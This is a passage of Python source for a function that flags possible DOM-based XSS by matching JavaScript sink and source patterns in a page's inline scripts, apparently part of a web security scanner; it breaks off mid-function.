def check_dom_xss(html: str, url: str) -> Optional[Dict[str, Any]]:
    """Detect DOM-based XSS by finding dangerous sink+source combos in JS."""
    scripts = re.findall(r"<script[^>]*>(.*?)</script>", html, re.DOTALL | re.IGNORECASE)
    all_js = "\n".join(scripts)

    found_sinks = [p for p in DOM_SINKS if re.search(p, all_js, re.IGNORECASE)]
    found_sources = [p for p in DOM_SOURCES if re.search(p, all_js, re.IGNORECASE)]

    if found_sinks and found_sources:
        sink_match = re.search(found_sinks[0], all_js, re.IGNORECASE)
        evidence = all_js[max(0, sink_match.start()-80): sink_match.start()+120].strip() if sink_match else ""
        sink_clean = found_sinks[0].replace(r'\s*', '')
